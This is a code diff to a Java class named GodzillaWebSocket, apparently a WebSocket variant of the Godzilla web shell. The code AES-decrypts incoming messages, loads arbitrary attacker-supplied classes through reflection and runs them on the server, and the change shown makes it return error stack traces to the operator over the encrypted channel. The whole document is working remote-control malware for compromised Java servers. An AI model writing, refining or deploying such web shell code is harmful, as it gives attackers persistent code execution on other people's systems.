@@ -7,6 +7,7 @@ import javax.websocket.EndpointConfig;
 import javax.websocket.MessageHandler;
 import javax.websocket.Session;
 import java.io.ByteArrayOutputStream;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.net.URL;
@@ -23,22 +24,28 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
 
     @Override
     public void onMessage(String message) {
+        byte[] result = null;
         try {
             byte[] data = base64Decode(message);
             data = x(data, false);
             if (payload == null || (data[0] == -54 && data[1] == -2)) {
                 payload = reflectionDefineClass(data);
-                session.getBasicRemote().sendText(base64Encode(x("ok".getBytes(), true)));
+                result = "ok".getBytes();
             } else {
                 ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                 Object f = payload.newInstance();
                 f.equals(arrOut);
                 f.equals(data);
                 f.toString();
-                session.getBasicRemote().sendText(base64Encode(x(arrOut.toByteArray(), true)));
+                result = arrOut.toByteArray();
             }
         } catch (Throwable e) {
             e.printStackTrace();
+            result = getErrorMessage(e).getBytes();
+        }
+        try {
+            session.getBasicRemote().sendText(base64Encode(x(result, true)));
+        } catch (Exception ignored) {
         }
     }
 
@@ -102,5 +109,20 @@ public class GodzillaWebSocket extends Endpoint implements MessageHandler.Whole<
         Cipher c = Cipher.getInstance("AES");
         c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
         return c.doFinal(s);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 }
